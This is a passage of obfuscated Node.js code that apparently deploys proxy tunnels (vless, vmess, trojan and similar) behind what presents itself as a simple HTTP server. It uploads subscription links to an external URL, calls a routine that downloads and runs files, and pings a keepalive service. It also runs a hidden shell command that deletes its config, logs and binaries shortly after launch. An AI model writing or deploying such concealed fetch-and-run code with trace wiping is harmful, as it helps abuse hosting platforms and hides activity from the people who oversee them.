null;}catch(_0x3943bf){if(_0x3943bf[_0x295a52(0x1d8)]){if(_0x3943bf['response'][_0x295a52(_0x35e566._0x396757)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x295a52(0x235)](listPath))return;const _0x126fa9=fs[_0x295a52(_0x35e566._0x110a8e)](listPath,_0x295a52(_0x35e566._0x428f53)),_0x14531c=_0x126fa9['split']('\x0a')['filter'](_0x1e9ada=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x295a52(0x26a)](_0x1e9ada));if(_0x14531c[_0x295a52(0x22d)]===0x0)return;const _0x3aad95=JSON[_0x295a52(_0x35e566._0x584abf)]({'nodes':_0x14531c});try{await axios[_0x295a52(0x1d7)](UPLOAD_URL+'/api/add-nodes',_0x3aad95,{'headers':{'Content-Type':_0x295a52(0x206)}});if(response[_0x295a52(_0x35e566._0x2a29aa)]===0xc8)console[_0x295a52(_0x35e566._0x20bada)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x420784){return null;}}else return;}}function cleanFiles(){const _0x15a99b={_0x426da5:0x1ef};setTimeout(()=>{const _0x934244={_0x512007:0x243},_0x15b836=_0x3e83,_0x291dbe=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x291dbe[_0x15b836(0x1c1)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x291dbe[_0x15b836(0x1c1)](phpPath);exec(_0x15b836(0x211)+_0x291dbe['join']('\x20')+_0x15b836(_0x15a99b._0x426da5),_0xba2bdb=>{const _0x2ec193=_0x15b836;console[_0x2ec193(_0x934244._0x512007)](),console['log']('App\x20is\x20running'),console['log'](_0x2ec193(0x269));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x44b568={_0x519c8e:0x1d6,_0x2fca26:0x24a,_0x3970b4:0x228,_0x45aece:0x1bd},_0xed17d9=_0x351477;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xed17d9(0x26b)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x1f0b87=await axios[_0xed17d9(0x1d7)](_0xed17d9(0x260),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console['log'](_0xed17d9(_0x44b568._0x519c8e));}catch(_0x178bfd){console[_0xed17d9(_0x44b568._0x2fca26)](_0xed17d9(_0x44b568._0x3970b4)+_0x178bfd[_0xed17d9(_0x44b568._0x45aece)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x351477(0x1ee)](PORT,()=>console[_0x351477(0x26b)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
